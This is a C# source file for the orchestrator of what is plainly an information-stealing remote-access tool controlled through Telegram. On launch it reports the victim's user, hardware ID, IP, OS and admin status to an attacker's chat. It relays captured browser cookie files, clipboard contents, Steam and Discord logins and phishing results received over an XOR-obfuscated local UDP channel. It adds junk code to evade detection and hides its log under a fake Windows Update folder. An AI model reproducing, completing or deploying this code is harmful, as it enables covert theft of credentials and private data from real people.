using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using VanguardCore;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Reflection;
using File = System.IO.File;

namespace FinalBot
{
    public class BotOrchestrator
    {
        // [POLY_JUNK]
        private static void _vanguard_bb8c073b() {
            int val = 76229;
            if (val > 50000) Console.WriteLine("Hash:" + 76229);
        }

        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly CommandHandler _commandHandler;
        private bool _isRunning = true;

        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
        public BotOrchestrator(string token, string adminId, HttpClient? client = null)
        {
            _botClient = new TelegramBotClient(token, client);
            _adminId = adminId;
            _commandHandler = new CommandHandler(_botClient, _adminId);
            TelegramService.Initialize(token, adminId, client);

            // NativeAOT Hint: preserve generic list of UpdateType
            GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
        }

        public async Task StartAsync()
        {
            try 
            {
                Console.WriteLine("[ORCHESTRATOR] Starting services...");
                DebugLog("[ORCHESTRATOR] Starting services...");
                
                // Start UDP listener for phishing reports (Steam/WeChat)
                DebugLog("[ORCHESTRATOR] Launching UDP listener...");
                _ = Task.Run(() => StartUdpListener());

                // 1. Initial Report (Async to prevent blocking)
                DebugLog("[ORCHESTRATOR] Sending startup report...");
                _ = Task.Run(async () => {
                    try { await SendStartupReport(); } catch { }
                });

                Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");

                var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
                {
                    AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
                };

                _botClient.StartReceiving(
                    updateHandler: async (c, u, ct) => {
                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [BOT] Update received: {u.Type}");
                        await _commandHandler.HandleUpdateAsync(c, u, ct);
                    },
                    pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
                    receiverOptions: receiverOptions,
                    cancellationToken: default
                );

                // Keep alive loop
                while (_isRunning)
                {
                    await Task.Delay(1000);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[STARTUP ERROR] {ex.Message}\n{ex.StackTrace}");
                DebugLog($"[{DateTime.Now}] [BOT ERROR] {ex}");
            }
        }

        private async Task SendStartupReport()
        {
            try 
            {
                var (ip, country, flag) = FinalBot.Modules.SystemInfoModule.GetCountryInfo();
                string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
                string osName = FinalBot.Modules.SystemInfoModule.GetFriendlyOSName();
                string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
                bool isInjected = Environment.CommandLine.Contains("--injected");
                string adminStatus = VanguardCore.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V6.11)" : "🟢 АДМИН") : "🟡 Обычный Юзер";

                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                              $"━━━━━━━━━━━━━━━━━━\n" +
                              $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                              $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                              $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                              $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                              $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
                              $"🎤 <b>Микрофон:</b> ✅\n" +
                              $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                              $"━━━━━━━━━━━━━━━━━━";
                
                string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";

                DebugLog($"[ORCHESTRATOR] Sending report to TG (ID: {pcUser})");
                bool success = await TelegramService.SendMessage(info, adminPanelMarkup);
                
                if (success)
                    DebugLog("[ORCHESTRATOR] Startup report SENT SUCCESSFULLY.");
                else
                    DebugLog("[ORCHESTRATOR] Startup report FAILED.");
            }
            catch (Exception ex)
            {
                DebugLog($"[ORCHESTRATOR] Error in SendStartupReport: {ex.Message}");
            }
        }

        private int _lastLogMessageId = 0;

        private async Task StartUdpListener()
        {
            int port = 51337;
            try
            {
                var localEndpoint = new IPEndPoint(IPAddress.Loopback, port);
                using var udpClient = new UdpClient(localEndpoint);
                Console.WriteLine($"[UDP] Listening on 127.0.0.1:{port}...");
                while (_isRunning)
                {
                    try
                    {
                        var result = await udpClient.ReceiveAsync();
                        string raw = Encoding.UTF8.GetString(result.Buffer);
                        string decrypted = DecryptString(raw);
                        if (string.IsNullOrEmpty(decrypted)) decrypted = raw;

                        if (decrypted.StartsWith("FILE:"))
                        {
                            string filePath = decrypted.Substring(5).Trim();
                            if (File.Exists(filePath))
                            {
                                using var stream = File.OpenRead(filePath);
                                await _botClient.SendDocumentAsync(
                                    chatId: _adminId,
                                    document: InputFile.FromStream(stream, Path.GetFileName(filePath)),
                                    caption: WrapWithSessionTag($"📦 <b>Cookies Captured:</b> <code>{Path.GetFileName(filePath)}</code>"),
                                    parseMode: ParseMode.Html
                                );
                                continue; 
                            }
                        }

                        if (decrypted.Contains("[Discord]") || decrypted.Contains("[PROGRESS]"))
                        {
                            int lastMsgId = CommandHandler.GetLastDiscordMessageId();
                            if (lastMsgId != 0)
                            {
                                try {
                                    await _botClient.EditMessageTextAsync(_adminId, lastMsgId, decrypted, parseMode: ParseMode.Html);
                                } catch { }
                            }
                            else 
                            {
                                var sent = await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html);
                                CommandHandler.SetLastDiscordMessageId(sent.MessageId);
                            }
                            continue;
                        }

                        if (decrypted.StartsWith("CLIPBOARD:"))
                        {
                            string content = decrypted.Substring(10).Trim();
                            await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag($"📋 <b>CLIPBOARD CAPTURED</b>\n━━━━━━━━━━━━━━━━━━\n<code>{content}</code>"), parseMode: ParseMode.Html);
                            continue;
                        }

                        bool isHighValue = decrypted.Contains("Captured") || decrypted.Contains("Steam") || decrypted.StartsWith("💎") || decrypted.StartsWith("🚨") || decrypted.StartsWith("✅") || decrypted.Contains("Login") || decrypted.Contains("Cookie");

                        if (isHighValue)
                        {
                            try { 
                                await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html); 
                                
                                // V6.15: Handle window closure to release Steam blocker if global toggle is OFF
                                if (decrypted.Contains("Window Closed") && !Modules.PhishManager.GlobalBlockSteam)
                                {
                                    Modules.PhishManager.StopLockdown();
                                }
                            } catch { }
                        }
                    }
                    catch (Exception ex) { Console.WriteLine($"[UDP ERROR] {ex.Message}"); }
                }
            }
            catch (Exception ex) { Console.WriteLine($"[UDP BIND ERROR] {ex.Message}"); }
        }

        private string WrapWithSessionTag(string message)
        {
            return $"{message}\n\n━━━━━━━━━━━━━━━━━━\n👤 <b>Session:</b> <code>{ConfigManager.VictimName}</code>";
        }

        private string DecryptString(string base64Encoded)
        {
            if (string.IsNullOrEmpty(base64Encoded)) return null;
            try {
                byte[] data = Convert.FromBase64String(base64Encoded);
                byte[] salt = Encoding.UTF8.GetBytes("c0mpl3x+S@lt#99");
                byte[] xorData = new byte[data.Length];
                for (int i = 0; i < data.Length; i++) xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
                return Encoding.UTF8.GetString(xorData);
            } catch { return null; }
        }

        private void DebugLog(string msg)
        {
            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
        }

        public void Stop() { _isRunning = false; }
    }
}
